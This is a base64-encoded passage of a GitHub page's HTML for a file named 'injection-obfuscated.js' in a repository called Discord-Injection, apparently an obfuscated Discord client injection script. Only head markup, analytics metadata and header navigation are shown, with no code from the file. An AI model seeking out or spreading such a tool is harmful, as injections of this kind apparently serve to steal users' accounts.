VzX2NvbW1pdC1jaGVja3Mtc3RhdHVzX2luZGV4X3RzLXVpX3BhY2thZ2VzLThhMDRkNS05ZjYxMzFkNDQ5YjguanMiPjwvc2NyaXB0Pgo8c2NyaXB0IGNyb3Nzb3JpZ2luPSJhbm9ueW1vdXMiIGRlZmVyPSJkZWZlciIgdHlwZT0iYXBwbGljYXRpb24vamF2YXNjcmlwdCIgc3JjPSJodHRwczovL2dpdGh1Yi5naXRodWJhc3NldHMuY29tL2Fzc2V0cy9hcHBfYXNzZXRzX21vZHVsZXNfcmVhY3QtY29kZS12aWV3X3BhZ2VzX0NvZGVWaWV3X3RzeC1mYmEzMDMzZGE0NjIuanMiPjwvc2NyaXB0Pgo8c2NyaXB0IGNyb3Nzb3JpZ2luPSJhbm9ueW1vdXMiIGRlZmVyPSJkZWZlciIgdHlwZT0iYXBwbGljYXRpb24vamF2YXNjcmlwdCIgc3JjPSJodHRwczovL2dpdGh1Yi5naXRodWJhc3NldHMuY29tL2Fzc2V0cy9yZWFjdC1jb2RlLXZpZXctOTg2MGVlNTA5ZDFlLmpzIj48L3NjcmlwdD4KCgogIDx0aXRsZT5EaXNjb3JkLUluamVjdGlvbi9pbmplY3Rpb24tb2JmdXNjYXRlZC5qcyBhdCBtYWluIMK3IHNrb2Nod2FzaGVyZS9EaXNjb3JkLUluamVjdGlvbiDCtyBHaXRIdWI8L3RpdGxlPgoKCgogIDxtZXRhIG5hbWU9InJvdXRlLXBhdHRlcm4iIGNvbnRlbnQ9Ii86dXNlcl9pZC86cmVwb3NpdG9yeS9ibG9iLypuYW1lKC8qcGF0aCkiPgoKICAgIAogIDxtZXRhIG5hbWU9ImN1cnJlbnQtY2F0YWxvZy1zZXJ2aWNlLWhhc2giIGNvbnRlbnQ9IjgyYzU2OWI5M2RhNWMxOGVkNjQ5ZWJkNGMyYzc5NDM3ZGI0NjExYTZhMTM3M2U4MDVhM2NiMDAxYzY0MTMwYjciPgoKCiAgPG1ldGEgbmFtZT0icmVxdWVzdC1pZCIgY29udGVudD0iRkY5Rjo1RUJEOjNENzhFQzo1NDA3RTk6NjU0N0YwMzIiIGRhdGEtcGpheC10cmFuc2llbnQ9InRydWUiLz48bWV0YSBuYW1lPSJodG1sLXNhZmUtbm9uY2UiIGNvbnRlbnQ9ImVmODZjNzYxNWFmMjIxMTNhYjE2NDkwOGVjOWQxZmZiNjQxYWZiZGFlN2I1MGIzZWMxZjMzN2JlMDkzM2NjOTQiIGRhdGEtcGpheC10cmFuc2llbnQ9InRydWUiLz48bWV0YSBuYW1lPSJ2aXNpdG9yLXBheWxvYWQiIGNvbnRlbnQ9ImV5SnlaV1psY25KbGNpSTZJaUlzSW5KbGNYVmxjM1JmYVdRaU9pSkdSamxHT2pWRlFrUTZNMFEzT0VWRE9qVTBNRGRGT1RvMk5UUTNSakF6TWlJc0luWnBjMmwwYjNKZmFXUWlPaUl6TWpZeE16WXpNRE00TWprMk9Ua3pPRFF5SWl3aWNtVm5hVzl1WDJWa1oyVWlPaUpwWVdRaUxDSnlaV2RwYjI1ZmNtVnVaR1Z5SWpvaWFXRmtJbjA9IiBkYXRhLXBqYXgtdHJhbnNpZW50PSJ0cnVlIi8+PG1ldGEgbmFtZT0idmlzaXRvci1obWFjIiBjb250ZW50PSI4MjRiMzZjZjcwN2U3ODY0YjZiZjlhMmFkZDMxMjYyM2YyOTkzYjM2MzI3NjY5MWMzODdiMWZmMmI4YWE4NDMyIiBkYXRhLXBqYXgtdHJhbnNpZW50PSJ0cnVlIi8+CgoKICAgIDxtZXRhIG5hbWU9ImhvdmVyY2FyZC1zdWJqZWN0LXRhZyIgY29udGVudD0icmVwb3NpdG9yeTo2NzYxMDAyMjYiIGRhdGEtdHVyYm8tdHJhbnNpZW50PgoKCiAgPG1ldGEgbmFtZT0iZ2l0aHViLWtleWJvYXJkLXNob3J0Y3V0cyIgY29udGVudD0icmVwb3NpdG9yeSxzb3VyY2UtY29kZSxmaWxlLXRyZWUiIGRhdGEtdHVyYm8tdHJhbnNpZW50PSJ0cnVlIiAvPgogIAoKICA8bWV0YSBuYW1lPSJzZWxlY3RlZC1saW5rIiB2YWx1ZT0icmVwb19zb3VyY2UiIGRhdGEtdHVyYm8tdHJhbnNpZW50PgogIDxsaW5rIHJlbD0iYXNzZXRzIiBocmVmPSJodHRwczovL2dpdGh1Yi5naXRodWJhc3NldHMuY29tLyI+CgogICAgPG1ldGEgbmFtZT0iZ29vZ2xlLXNpdGUtdmVyaWZpY2F0aW9uIiBjb250ZW50PSJjMWt1RC1LMkhJVkY2MzVseXBjc1dQb0Q0a2lsbzUtakFfd0JGeVQ0dU1ZIj4KICA8bWV0YSBuYW1lPSJnb29nbGUtc2l0ZS12ZXJpZmljYXRpb24iIGNvbnRlbnQ9IktUNWdzOGgwd3ZhYWdMS0FWV3E4YmJlTnduWlpLMXIxWFF5c1gzeHVyTFUiPgogIDxtZXRhIG5hbWU9Imdvb2dsZS1zaXRlLXZlcmlmaWNhdGlvbiIgY29udGVudD0iWnpoVnlFRndiN3czZTAtdU9UbHRtOEpzY2syRjVTdFZpaEQwZXh3MmZzQSI+CiAgPG1ldGEgbmFtZT0iZ29vZ2xlLXNpdGUtdmVyaWZpY2F0aW9uIiBjb250ZW50PSJHWHM1S29VVWtOQ29hQVpuN3dQTi10MDFQeXdwOU0zc0VqbnRfM19aV1BjIj4KICA8bWV0YSBuYW1lPSJnb29nbGUtc2l0ZS12ZXJpZmljYXRpb24iIGNvbnRlbnQ9IkFwaWI3LXg5OEgwajVjUHFIV3dTTW02ZE5VNEdtT0RSb3F4TGlEemR4OUkiPgoKPG1ldGEgbmFtZT0ib2N0b2x5dGljcy11cmwiIGNvbnRlbnQ9Imh0dHBzOi8vY29sbGVjdG9yLmdpdGh1Yi5jb20vZ2l0aHViL2NvbGxlY3QiIC8+CgogIDxtZXRhIG5hbWU9ImFuYWx5dGljcy1sb2NhdGlvbiIgY29udGVudD0iLyZsdDt1c2VyLW5hbWUmZ3Q7LyZsdDtyZXBvLW5hbWUmZ3Q7L2Jsb2Ivc2hvdyIgZGF0YS10dXJiby10cmFuc2llbnQ9InRydWUiIC8+CgogIAoKCgoKICAKCiAgICA8bWV0YSBuYW1lPSJ1c2VyLWxvZ2luIiBjb250ZW50PSIiPgoKICAKCiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoIj4KICAgIAogICAgICA8bWV0YSBuYW1lPSJkZXNjcmlwdGlvbiIgY29udGVudD0iQ29udHJpYnV0ZSB0byBza29jaHdhc2hlcmUvRGlzY29yZC1JbmplY3Rpb24gZGV2ZWxvcG1lbnQgYnkgY3JlYXRpbmcgYW4gYWNjb3VudCBvbiBHaXRIdWIuIj4KICAgICAgPGxpbmsgcmVsPSJzZWFyY2giIHR5cGU9ImFwcGxpY2F0aW9uL29wZW5zZWFyY2hkZXNjcmlwdGlvbit4bWwiIGhyZWY9Ii9vcGVuc2VhcmNoLnhtbCIgdGl0bGU9IkdpdEh1YiI+CiAgICA8bGluayByZWw9ImZsdWlkLWljb24iIGhyZWY9Imh0dHBzOi8vZ2l0aHViLmNvbS9mbHVpZGljb24ucG5nIiB0aXRsZT0iR2l0SHViIj4KICAgIDxtZXRhIHByb3BlcnR5PSJmYjphcHBfaWQiIGNvbnRlbnQ9IjE0MDE0ODg2OTM0MzY1MjgiPgogICAgPG1ldGEgbmFtZT0iYXBwbGUtaXR1bmVzLWFwcCIgY29udGVudD0iYXBwLWlkPTE0NzczNzY5MDUsIGFwcC1hcmd1bWVudD1odHRwczovL2dpdGh1Yi5jb20vc2tvY2h3YXNoZXJlL0Rpc2NvcmQtSW5qZWN0aW9uL2Jsb2IvbWFpbi9pbmplY3Rpb24tb2JmdXNjYXRlZC5qcyIgLz4KICAgICAgPG1ldGEgbmFtZT0idHdpdHRlcjppbWFnZTpzcmMiIGNvbnRlbnQ9Imh0dHBzOi8vb3BlbmdyYXBoLmdpdGh1YmFzc2V0cy5jb20vMmJmZDViYTkzMDU0YTZjNzZiYTM1YTU5N2MxZmZhMmE0N2QwNDgwNWJhMjIzYWY2YmNjZGRjYjIxYjA4ZTQyOC9za29jaHdhc2hlcmUvRGlzY29yZC1JbmplY3Rpb24iIC8+PG1ldGEgbmFtZT0idHdpdHRlcjpzaXRlIiBjb250ZW50PSJAZ2l0aHViIiAvPjxtZXRhIG5hbWU9InR3aXR0ZXI6Y2FyZCIgY29udGVudD0ic3VtbWFyeV9sYXJnZV9pbWFnZSIgLz48bWV0YSBuYW1lPSJ0d2l0dGVyOnRpdGxlIiBjb250ZW50PSJEaXNjb3JkLUluamVjdGlvbi9pbmplY3Rpb24tb2JmdXNjYXRlZC5qcyBhdCBtYWluIMK3IHNrb2Nod2FzaGVyZS9EaXNjb3JkLUluamVjdGlvbiIgLz48bWV0YSBuYW1lPSJ0d2l0dGVyOmRlc2NyaXB0aW9uIiBjb250ZW50PSJDb250cmlidXRlIHRvIHNrb2Nod2FzaGVyZS9EaXNjb3JkLUluamVjdGlvbiBkZXZlbG9wbWVudCBieSBjcmVhdGluZyBhbiBhY2NvdW50IG9uIEdpdEh1Yi4iIC8+CiAgICAgIDxtZXRhIHByb3BlcnR5PSJvZzppbWFnZSIgY29udGVudD0iaHR0cHM6Ly9vcGVuZ3JhcGguZ2l0aHViYXNzZXRzLmNvbS8yYmZkNWJhOTMwNTRhNmM3NmJhMzVhNTk3YzFmZmEyYTQ3ZDA0ODA1YmEyMjNhZjZiY2NkZGNiMjFiMDhlNDI4L3Nrb2Nod2FzaGVyZS9EaXNjb3JkLUluamVjdGlvbiIgLz48bWV0YSBwcm9wZXJ0eT0ib2c6aW1hZ2U6YWx0IiBjb250ZW50PSJDb250cmlidXRlIHRvIHNrb2Nod2FzaGVyZS9EaXNjb3JkLUluamVjdGlvbiBkZXZlbG9wbWVudCBieSBjcmVhdGluZyBhbiBhY2NvdW50IG9uIEdpdEh1Yi4iIC8+PG1ldGEgcHJvcGVydHk9Im9nOmltYWdlOndpZHRoIiBjb250ZW50PSIxMjAwIiAvPjxtZXRhIHByb3BlcnR5PSJvZzppbWFnZTpoZWlnaHQiIGNvbnRlbnQ9IjYwMCIgLz48bWV0YSBwcm9wZXJ0eT0ib2c6c2l0ZV9uYW1lIiBjb250ZW50PSJHaXRIdWIiIC8+PG1ldGEgcHJvcGVydHk9Im9nOnR5cGUiIGNvbnRlbnQ9Im9iamVjdCIgLz48bWV0YSBwcm9wZXJ0eT0ib2c6dGl0bGUiIGNvbnRlbnQ9IkRpc2NvcmQtSW5qZWN0aW9uL2luamVjdGlvbi1vYmZ1c2NhdGVkLmpzIGF0IG1haW4gwrcgc2tvY2h3YXNoZXJlL0Rpc2NvcmQtSW5qZWN0aW9uIiAvPjxtZXRhIHByb3BlcnR5PSJvZzp1cmwiIGNvbnRlbnQ9Imh0dHBzOi8vZ2l0aHViLmNvbS9za29jaHdhc2hlcmUvRGlzY29yZC1JbmplY3Rpb24vYmxvYi9tYWluL2luamVjdGlvbi1vYmZ1c2NhdGVkLmpzIiAvPjxtZXRhIHByb3BlcnR5PSJvZzpkZXNjcmlwdGlvbiIgY29udGVudD0iQ29udHJpYnV0ZSB0byBza29jaHdhc2hlcmUvRGlzY29yZC1JbmplY3Rpb24gZGV2ZWxvcG1lbnQgYnkgY3JlYXRpbmcgYW4gYWNjb3VudCBvbiBHaXRIdWIuIiAvPgogICAgICAKCgoKICAgICAgICA8bWV0YSBuYW1lPSJob3N0bmFtZSIgY29udGVudD0iZ2l0aHViLmNvbSI+CgoKCiAgICAgICAgPG1ldGEgbmFtZT0iZXhwZWN0ZWQtaG9zdG5hbWUiIGNvbnRlbnQ9ImdpdGh1Yi5jb20iPgoKCiAgPG1ldGEgaHR0cC1lcXVpdj0ieC1wamF4LXZlcnNpb24iIGNvbnRlbnQ9IjY2ZjNmMjcxZDdjNmZmOTEyNWY0NDc4ZTU3MTMyYTBlNzU0OGI1NmIzM2IzY2I1NjljNjI1NTE4YTg2ZWNlNGYiIGRhdGEtdHVyYm8tdHJhY2s9InJlbG9hZCI+CiAgPG1ldGEgaHR0cC1lcXVpdj0ieC1wamF4LWNzcC12ZXJzaW9uIiBjb250ZW50PSI4NDQyMTFlYjkwMjk2Yzk5MGJmOGJhM2ExMTBhYjlkMjZhNjY2MjE3YTQ0ZWJlNTE1MjM2OTFmYjRhNGJmNmNkIiBkYXRhLXR1cmJvLXRyYWNrPSJyZWxvYWQiPgogIDxtZXRhIGh0dHAtZXF1aXY9IngtcGpheC1jc3MtdmVyc2lvbiIgY29udGVudD0iZDVmNzc5NzNlNzg1OWNiMmI3ZjA3YzMxNWY0M2IwZGQ0MjIxZGMxM2Y2NTUxMjNiOTZhYTk3M2IxNzYxZTc2MCIgZGF0YS10dXJiby10cmFjaz0icmVsb2FkIj4KICA8bWV0YSBodHRwLWVxdWl2PSJ4LXBqYXgtanMtdmVyc2lvbiIgY29udGVudD0iNzk5MGYwODQwZGJkOTcyYjRmYWFhYWZlZThiNzExYmUxN2Q0OTgyYzY0Y2Q2ODhjMWFjOWQ4OWNhYzY0MTkyOSIgZGF0YS10dXJiby10cmFjaz0icmVsb2FkIj4KCiAgPG1ldGEgbmFtZT0idHVyYm8tY2FjaGUtY29udHJvbCIgY29udGVudD0ibm8tcHJldmlldyIgZGF0YS10dXJiby10cmFuc2llbnQ9IiI+CgogICAgICA8bWV0YSBuYW1lPSJ0dXJiby1jYWNoZS1jb250cm9sIiBjb250ZW50PSJuby1jYWNoZSIgZGF0YS10dXJiby10cmFuc2llbnQ+CiAgICA8bWV0YSBkYXRhLWh5ZHJvc3RhdHM9InB1Ymxpc2giPgoKICA8bWV0YSBuYW1lPSJnby1pbXBvcnQiIGNvbnRlbnQ9ImdpdGh1Yi5jb20vc2tvY2h3YXNoZXJlL0Rpc2NvcmQtSW5qZWN0aW9uIGdpdCBodHRwczovL2dpdGh1Yi5jb20vc2tvY2h3YXNoZXJlL0Rpc2NvcmQtSW5qZWN0aW9uLmdpdCI+CgogIDxtZXRhIG5hbWU9Im9jdG9seXRpY3MtZGltZW5zaW9uLXVzZXJfaWQiIGNvbnRlbnQ9IjE0MTczODcyNCIgLz48bWV0YSBuYW1lPSJvY3RvbHl0aWNzLWRpbWVuc2lvbi11c2VyX2xvZ2luIiBjb250ZW50PSJza29jaHdhc2hlcmUiIC8+PG1ldGEgbmFtZT0ib2N0b2x5dGljcy1kaW1lbnNpb24tcmVwb3NpdG9yeV9pZCIgY29udGVudD0iNjc2MTAwMjI2IiAvPjxtZXRhIG5hbWU9Im9jdG9seXRpY3MtZGltZW5zaW9uLXJlcG9zaXRvcnlfbndvIiBjb250ZW50PSJza29jaHdhc2hlcmUvRGlzY29yZC1JbmplY3Rpb24iIC8+PG1ldGEgbmFtZT0ib2N0b2x5dGljcy1kaW1lbnNpb24tcmVwb3NpdG9yeV9wdWJsaWMiIGNvbnRlbnQ9InRydWUiIC8+PG1ldGEgbmFtZT0ib2N0b2x5dGljcy1kaW1lbnNpb24tcmVwb3NpdG9yeV9pc19mb3JrIiBjb250ZW50PSJmYWxzZSIgLz48bWV0YSBuYW1lPSJvY3RvbHl0aWNzLWRpbWVuc2lvbi1yZXBvc2l0b3J5X25ldHdvcmtfcm9vdF9pZCIgY29udGVudD0iNjc2MTAwMjI2IiAvPjxtZXRhIG5hbWU9Im9jdG9seXRpY3MtZGltZW5zaW9uLXJlcG9zaXRvcnlfbmV0d29ya19yb290X253byIgY29udGVudD0ic2tvY2h3YXNoZXJlL0Rpc2NvcmQtSW5qZWN0aW9uIiAvPgoKCgogIDxtZXRhIG5hbWU9InR1cmJvLWJvZHktY2xhc3NlcyIgY29udGVudD0ibG9nZ2VkLW91dCBlbnYtcHJvZHVjdGlvbiBwYWdlLXJlc3BvbnNpdmUiPgoKCiAgPG1ldGEgbmFtZT0iYnJvd3Nlci1zdGF0cy11cmwiIGNvbnRlbnQ9Imh0dHBzOi8vYXBpLmdpdGh1Yi5jb20vX3ByaXZhdGUvYnJvd3Nlci9zdGF0cyI+CgogIDxtZXRhIG5hbWU9ImJyb3dzZXItZXJyb3JzLXVybCIgY29udGVudD0iaHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9fcHJpdmF0ZS9icm93c2VyL2Vycm9ycyI+CgogIDxtZXRhIG5hbWU9ImJyb3dzZXItb3B0aW1pemVseS1jbGllbnQtZXJyb3JzLXVybCIgY29udGVudD0iaHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9fcHJpdmF0ZS9icm93c2VyL29wdGltaXplbHlfY2xpZW50L2Vycm9ycyI+CgogIDxsaW5rIHJlbD0ibWFzay1pY29uIiBocmVmPSJodHRwczovL2dpdGh1Yi5naXRodWJhc3NldHMuY29tL2Fzc2V0cy9waW5uZWQtb2N0b2NhdC0wOTNkYTNlNmZhNDAuc3ZnIiBjb2xvcj0iIzAwMDAwMCI+CiAgPGxpbmsgcmVsPSJhbHRlcm5hdGUgaWNvbiIgY2xhc3M9ImpzLXNpdGUtZmF2aWNvbiIgdHlwZT0iaW1hZ2UvcG5nIiBocmVmPSJodHRwczovL2dpdGh1Yi5naXRodWJhc3NldHMuY29tL2Zhdmljb25zL2Zhdmljb24ucG5nIj4KICA8bGluayByZWw9Imljb24iIGNsYXNzPSJqcy1zaXRlLWZhdmljb24iIHR5cGU9ImltYWdlL3N2Zyt4bWwiIGhyZWY9Imh0dHBzOi8vZ2l0aHViLmdpdGh1YmFzc2V0cy5jb20vZmF2aWNvbnMvZmF2aWNvbi5zdmciPgoKPG1ldGEgbmFtZT0idGhlbWUtY29sb3IiIGNvbnRlbnQ9IiMxZTIzMjciPgo8bWV0YSBuYW1lPSJjb2xvci1zY2hlbWUiIGNvbnRlbnQ9ImxpZ2h0IGRhcmsiIC8+CgoKICA8bGluayByZWw9Im1hbmlmZXN0IiBocmVmPSIvbWFuaWZlc3QuanNvbiIgY3Jvc3NPcmlnaW49InVzZS1jcmVkZW50aWFscyI+CgogIDwvaGVhZD4KCiAgPGJvZHkgY2xhc3M9ImxvZ2dlZC1vdXQgZW52LXByb2R1Y3Rpb24gcGFnZS1yZXNwb25zaXZlIiBzdHlsZT0id29yZC13cmFwOiBicmVhay13b3JkOyI+CiAgICA8ZGl2IGRhdGEtdHVyYm8tYm9keSBjbGFzcz0ibG9nZ2VkLW91dCBlbnYtcHJvZHVjdGlvbiBwYWdlLXJlc3BvbnNpdmUiIHN0eWxlPSJ3b3JkLXdyYXA6IGJyZWFrLXdvcmQ7Ij4KICAgICAgCgoKICAgIDxkaXYgY2xhc3M9InBvc2l0aW9uLXJlbGF0aXZlIGpzLWhlYWRlci13cmFwcGVyICI+CiAgICAgIDxhIGhyZWY9IiNzdGFydC1vZi1jb250ZW50IiBjbGFzcz0icHgtMiBweS00IGNvbG9yLWJnLWFjY2VudC1lbXBoYXNpcyBjb2xvci1mZy1vbi1lbXBoYXNpcyBzaG93LW9uLWZvY3VzIGpzLXNraXAtdG8tY29udGVudCI+U2tpcCB0byBjb250ZW50PC9hPgogICAgICA8c3BhbiBkYXRhLXZpZXctY29tcG9uZW50PSJ0cnVlIiBjbGFzcz0icHJvZ3Jlc3MtcGpheC1sb2FkZXIgUHJvZ3Jlc3MgcG9zaXRpb24tZml4ZWQgd2lkdGgtZnVsbCI+CiAgICA8c3BhbiBzdHlsZT0id2lkdGg6IDAlOyIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9IlByb2dyZXNzLWl0ZW0gcHJvZ3Jlc3MtcGpheC1sb2FkZXItYmFyIGxlZnQtMCB0b3AtMCBjb2xvci1iZy1hY2NlbnQtZW1waGFzaXMiPjwvc3Bhbj4KPC9zcGFuPiAgICAgIAogICAgICAKCgogICAgICAKCiAgICAgICAgCgogICAgICAgICAgICAKCjxzY3JpcHQgY3Jvc3NvcmlnaW49ImFub255bW91cyIgZGVmZXI9ImRlZmVyIiB0eXBlPSJhcHBsaWNhdGlvbi9qYXZhc2NyaXB0IiBzcmM9Imh0dHBzOi8vZ2l0aHViLmdpdGh1YmFzc2V0cy5jb20vYXNzZXRzL3ZlbmRvcnMtbm9kZV9tb2R1bGVzX2dpdGh1Yl9yZW1vdGUtZm9ybV9kaXN0X2luZGV4X2pzLW5vZGVfbW9kdWxlc19kZWxlZ2F0ZWQtZXZlbnRzX2Rpc3RfaW5kZS05NGZkNjctOTk1MTk1ODFkMGY4LmpzIj48L3NjcmlwdD4KPHNjcmlwdCBjcm9zc29yaWdpbj0iYW5vbnltb3VzIiBkZWZlcj0iZGVmZXIiIHR5cGU9ImFwcGxpY2F0aW9uL2phdmFzY3JpcHQiIHNyYz0iaHR0cHM6Ly9naXRodWIuZ2l0aHViYXNzZXRzLmNvbS9hc3NldHMvc2Vzc2lvbnMtNzZlMjhkNWM5NTM2LmpzIj48L3NjcmlwdD4KPGhlYWRlciBjbGFzcz0iSGVhZGVyLW9sZCBoZWFkZXItbG9nZ2VkLW91dCBqcy1kZXRhaWxzLWNvbnRhaW5lciBEZXRhaWxzIHBvc2l0aW9uLXJlbGF0aXZlIGY0IHB5LTMiIHJvbGU9ImJhbm5lciIgZGF0YS1jb2xvci1tb2RlPWxpZ2h0IGRhdGEtbGlnaHQtdGhlbWU9bGlnaHQgZGF0YS1kYXJrLXRoZW1lPWRhcms+CiAgPGJ1dHRvbiB0eXBlPSJidXR0b24iIGNsYXNzPSJIZWFkZXItYmFja2Ryb3AgZC1sZy1ub25lIGJvcmRlci0wIHBvc2l0aW9uLWZpeGVkIHRvcC0wIGxlZnQtMCB3aWR0aC1mdWxsIGhlaWdodC1mdWxsIGpzLWRldGFpbHMtdGFyZ2V0IiBhcmlhLWxhYmVsPSJUb2dnbGUgbmF2aWdhdGlvbiI+CiAgICA8c3BhbiBjbGFzcz0iZC1ub25lIj5Ub2dnbGUgbmF2aWdhdGlvbjwvc3Bhbj4KICA8L2J1dHRvbj4KCiAgPGRpdiBjbGFzcz0iIGQtZmxleCBmbGV4LWNvbHVtbiBmbGV4LWxnLXJvdyBmbGV4LWl0ZW1zLWNlbnRlciBwLXJlc3BvbnNpdmUgaGVpZ2h0LWZ1bGwgcG9zaXRpb24tcmVsYXRpdmUgei0xIj4KICAgIDxkaXYgY2xhc3M9ImQtZmxleCBmbGV4LWp1c3RpZnktYmV0d2VlbiBmbGV4LWl0ZW1zLWNlbnRlciB3aWR0aC1mdWxsIHdpZHRoLWxnLWF1dG8iPgogICAgICA8YSBjbGFzcz0ibXItbGctMyBjb2xvci1mZy1pbmhlcml0IGZsZXgtb3JkZXItMiIgaHJlZj0iaHR0cHM6Ly9naXRodWIuY29tLyIgYXJpYS1sYWJlbD0iSG9tZXBhZ2UiIGRhdGEtZ2EtY2xpY2s9IihMb2dnZWQgb3V0KSBIZWFkZXIsIGdvIHRvIGhvbWVwYWdlLCBpY29uOmxvZ28td29yZG1hcmsiPgogICAgICAgIDxzdmcgaGVpZ2h0PSIzMiIgYXJpYS1oaWRkZW49InRydWUiIHZpZXdCb3g9IjAgMCAxNiAxNiIgdmVyc2lvbj0iMS4xIiB3aWR0aD0iMzIiIGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJvY3RpY29uIG9jdGljb24tbWFyay1naXRodWIiPgogICAgPHBhdGggZD0iTTggMGM0LjQyIDAgOCAzLjU4IDggOGE4LjAxMyA4LjAxMyAwIDAgMS01LjQ1IDcuNTljLS40LjA4LS41NS0uMTctLjU1LS4zOCAwLS4yNy4wMS0xLjEzLjAxLTIuMiAwLS43NS0uMjUtMS4yMy0uNTQtMS40OCAxLjc4LS4yIDMuNjUtLjg4IDMuNjUtMy45NSAwLS44OC0uMzEtMS41OS0uODItMi4xNS4wOC0uMi4zNi0xLjAyLS4wOC0yLjEyIDAgMC0uNjctLjIyLTIuMi44Mi0uNjQtLjE4LTEuMzItLjI3LTItLjI3LS42OCAwLTEuMzYuMDktMiAuMjctMS41My0xLjAzLTIuMi0uODItMi4yLS44Mi0uNDQgMS4xLS4xNiAxLjkyLS4wOCAyLjEyLS41MS41Ni0uODIgMS4yOC0uODIgMi4xNSAwIDMuMDYgMS44NiAzLjc1IDMuNjQgMy45NS0uMjMuMi0uNDQuNTUtLjUxIDEuMDctLjQ2LjIxLTEuNjEuNTUtMi4zMy0uNjYtLjE1LS4yNC0uNi0uODMtMS4yMy0uODItLjY3LjAxLS4yNy4zOC4wMS41My4zNC4xOS43My45LjgyIDEuMTMuMTYuNDUuNjggMS4zMSAyLjY5Ljk0IDAgLjY3LjAxIDEuMy4wMSAxLjQ5IDAgLjIxLS4xNS40NS0uNTUuMzhBNy45OTUgNy45OTUgMCAwIDEgMCA4YzAtNC40MiAzLjU4LTggOC04WiI+PC9wYXRoPgo8L3N2Zz4KICAgICAgPC9hPgoKICAgICAgICA8ZGl2IGNsYXNzPSJmbGV4LTEiPgogICAgICAgICAgPGEgaHJlZj0iL3NpZ251cD9yZWZfY3RhPVNpZ24rdXAmYW1wO3JlZl9sb2M9aGVhZGVyK2xvZ2dlZCtvdXQmYW1wO3JlZl9wYWdlPSUyRiUzQ3VzZXItbmFtZSUzRSUyRiUzQ3JlcG8tbmFtZSUzRSUyRmJsb2IlMkZzaG93JmFtcDtzb3VyY2U9aGVhZGVyLXJlcG8iCiAgICAgICAgICAgIGNsYXNzPSJkLWlubGluZS1ibG9jayBkLWxnLW5vbmUgZmxleC1vcmRlci0xIGY1IG5vLXVuZGVybGluZSBib3JkZXIgY29sb3ItYm9yZGVyLWRlZmF1bHQgcm91bmRlZC0yIHB4LTIgcHktMSBjb2xvci1mZy1pbmhlcml0IgogICAgICAgICAgICBkYXRhLWh5ZHJvLWNsaWNrPSJ7JnF1b3Q7ZXZlbnRfdHlwZSZxdW90OzomcXVvdDthdXRoZW50aWNhdGlvbi5jbGljayZxdW90OywmcXVvdDtwYXlsb2FkJnF1b3Q7OnsmcXVvdDtsb2NhdGlvbl9pbl9wYWdlJnF1b3Q7OiZxdW90O3NpdGUgaGVhZGVyJnF1b3Q7LCZxdW90O3JlcG9zaXRvcnlfaWQmcXVvdDs6bnVsbCwmcXVvdDthdXRoX3R5cGUmcXVvdDs6JnF1b3Q7U0lHTl9VUCZxdW90OywmcXVvdDtvcmlnaW5hdGluZ191cmwmcXVvdDs6JnF1b3Q7aHR0cHM6Ly9naXRodWIuY29tL3Nrb2Nod2FzaGVyZS9EaXNjb3JkLUluamVjdGlvbi9ibG9iL21haW4vaW5qZWN0aW9uLW9iZnVzY2F0ZWQuanMmcXVvdDssJnF1b3Q7dXNlcl9pZCZxdW90OzpudWxsfX0iIGRhdGEtaHlkcm8tY2xpY2staG1hYz0iNjA0NzczN2IyYWM0NjBlZmQwYmQzZmU4M2FhYWU5MzVkOWM5ZmE1MGY4NmQ1NzcxYjM2ODBjNzVlMjhlNmEyMSIKICAgICAgICAgID4KICAgICAgICAgICAgU2lnbiZuYnNwO3VwCiAgICAgICAgICA8L2E+CiAgICAgICAgPC9kaXY+CgogICAgICA8ZGl2IGNsYXNzPSJmbGV4LTEgZmxleC1vcmRlci0yIHRleHQtcmlnaHQiPgogICAgICAgICAgPGJ1dHRvbiBhcmlhLWxhYmVsPSJUb2dnbGUgbmF2aWdhdGlvbiIgYXJpYS1leHBhbmRlZD0iZmFsc2UiIHR5cGU9ImJ1dHRvbiIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9ImpzLWRldGFpbHMtdGFyZ2V0IEJ1dHRvbi0tbGluayBCdXR0b24tLW1lZGl1bSBCdXR0b24gZC1sZy1ub25lIGNvbG9yLWZnLWluaGVyaXQgcC0xIj4gICAgPHNwYW4gY2xhc3M9IkJ1dHRvbi1jb250ZW50Ij4KICAgICAgPHNwYW4gY2xhc3M9IkJ1dHRvbi1sYWJlbCI+PGRpdiBjbGFzcz0iSGVhZGVyTWVudS10b2dnbGUtYmFyIHJvdW5kZWQgbXktMSI+PC9kaXY+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9IkhlYWRlck1lbnUtdG9nZ2xlLWJhciByb3VuZGVkIG15LTEiPjwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJIZWFkZXJNZW51LXRvZ2dsZS1iYXIgcm91bmRlZCBteS0xIj48L2Rpdj48L3NwYW4+CiAgICA8L3NwYW4+CjwvYnV0dG9uPiAgCiAgICAgIDwvZGl2PgogICAgPC9kaXY+CgoKICAgIDxkaXYgY2xhc3M9IkhlYWRlck1lbnUtLWxvZ2dlZC1vdXQgcC1yZXNwb25zaXZlIGhlaWdodC1maXQgcG9zaXRpb24tbGctcmVsYXRpdmUgZC1sZy1mbGV4IGZsZXgtY29sdW1uIGZsZXgtYXV0byBwdC03IHBiLTQgdG9wLTAiPgogICAgICA8ZGl2IGNsYXNzPSJoZWFkZXItbWVudS13cmFwcGVyIGQtZmxleCBmbGV4LWNvbHVtbiBmbGV4LXNlbGYtZW5kIGZsZXgtbGctcm93IGZsZXgtanVzdGlmeS1iZXR3ZWVuIGZsZXgtYXV0byBwLTMgcC1sZy0wIHJvdW5kZWQgcm91bmRlZC1sZy0wIG10LTMgbXQtbGctMCI+CiAgICAgICAgICA8bmF2IGNsYXNzPSJtdC0wIHB4LTMgcHgtbGctMCBtYi0zIG1iLWxnLTAiIGFyaWEtbGFiZWw9Ikdsb2JhbCI+CiAgICAgICAgICAgIDx1bCBjbGFzcz0iZC1sZy1mbGV4IGxpc3Qtc3R5bGUtbm9uZSI+CiAgICAgICAgICAgICAgICA8bGkgY2xhc3M9IkhlYWRlck1lbnUtaXRlbSBwb3NpdGlvbi1yZWxhdGl2ZSBmbGV4LXdyYX